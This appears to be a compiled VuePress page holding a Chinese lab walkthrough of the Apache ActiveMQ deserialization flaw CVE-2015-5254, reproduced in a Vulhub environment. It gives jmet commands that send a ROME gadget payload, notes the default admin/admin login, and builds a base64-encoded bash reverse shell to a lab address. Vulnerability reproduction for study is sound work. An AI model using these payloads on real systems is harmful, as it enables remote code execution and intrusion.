import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r,o as l,c as d,a as e,b as a,d as i,e as n}from"./app-58e4a7d6.js";const p={},c=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring Framework等。Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java消息服务（JMS）ObjectMessage对象利用该漏洞执行任意代码。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Apache ActiveMQ 5.13.0之前5.x版本
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><h3 id="安装jdk" tabindex="-1"><a class="header-anchor" href="#安装jdk" aria-hidden="true">#</a> 安装jdk</h3><p>查看java版本，如果是java 11需要切换到java 8</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>java -version
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>安装java 8，默认安装路径/usr/lib/jvm/java-8-openjdk-amd64</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>sudo apt install openjdk-8-jdk
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>配置环境变量，添加jdk安装路径</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>sudo vim ~/.bashrc

# 在最后一行添加
export JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="切换jdk版本" tabindex="-1"><a class="header-anchor" href="#切换jdk版本" aria-hidden="true">#</a> 切换jdk版本</h3><p>采用update-alternatives命令进行版本切换</p><p>/usr/bin/java和/usr/lib/jvm/java-8-openjdk-amd64/bin/java两个路径一定要和自己的路径吻合</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>sudo update-alternatives --install /usr/bin/java java /usr/lib/jvm/java-8-openjdk-amd64/bin/java 1070
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>切换jdk</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>sudo update-alternatives --config java
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202211324903.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>再次查看java版本，切换成功</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202211324904.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>Vulhub搭建及运行漏洞环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,24),o={href:"https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar",target:"_blank",rel:"noopener noreferrer"},u=n(`<div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">wget</span> https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar
<span class="token function">mkdir</span> external
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>对目标发送一个生成**/tmp/awesome_poc**的 payload</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch /tmp/awesome_poc&quot; -Yp ROME 192.168.174.128 61616
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202211345369.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,4),v={href:"http://192.168.174.128:8161/admin/browse.jsp?JMSDestination=event",target:"_blank",rel:"noopener noreferrer"},m=n(`<p>默认账号密码：admin/admin</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202211345370.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>点击这个信息触发文件创建，成功执行命令 touch /tmp/awesome_poc</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202211345371.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p><img src="https://cb86160.webp.li/makabaka-r1-photo/202202211324906.png" alt="" loading="lazy">也可以创建一个反弹shell的payload</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">&gt;&amp;</span> /dev/tcp/192.168.174.128/9999 <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>  <span class="token punctuation">(</span>base64编码<span class="token punctuation">)</span>
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYx

<span class="token function">bash</span> <span class="token parameter variable">-c</span> <span class="token punctuation">{</span>echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYx<span class="token punctuation">}</span><span class="token operator">|</span><span class="token punctuation">{</span>base64,-d<span class="token punctuation">}</span><span class="token operator">|</span><span class="token punctuation">{</span>bash,-i<span class="token punctuation">}</span>

<span class="token comment"># 发送payload</span>
<span class="token function">java</span> <span class="token parameter variable">-jar</span> jmet-0.1.0-all.jar <span class="token parameter variable">-Q</span> event <span class="token parameter variable">-I</span> ActiveMQ <span class="token parameter variable">-s</span> <span class="token parameter variable">-Y</span> <span class="token string">&quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}&quot;</span> <span class="token parameter variable">-Yp</span> ROME <span class="token number">192.168</span>.174.128 <span class="token number">61616</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202211345372.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>查看消息队列，ID为kali-38435-1645422155171-1:1:1:1:1</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202211345373.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>监听9999端口，点击消息队列会触发命令执行，反弹Shell</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202211345374.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,11);function b(g,h){const s=r("ExternalLinkIcon");return l(),d("div",null,[c,e("p",null,[a("下载 jmet "),e("a",o,[a("下载链接"),i(s)])]),u,e("p",null,[a("访问 "),e("a",v,[a("http://192.168.174.128:8161/admin/browse.jsp?JMSDestination=event"),i(s)]),a(" 可以看到多了一条消息队列，ID为kali-38087-1645421794512-1:1:1:1:1")]),m])}const j=t(p,[["render",b],["__file","Apache ActiveMQ 反序列化漏洞 CVE-2015-5254.html.vue"]]);export{j as default};
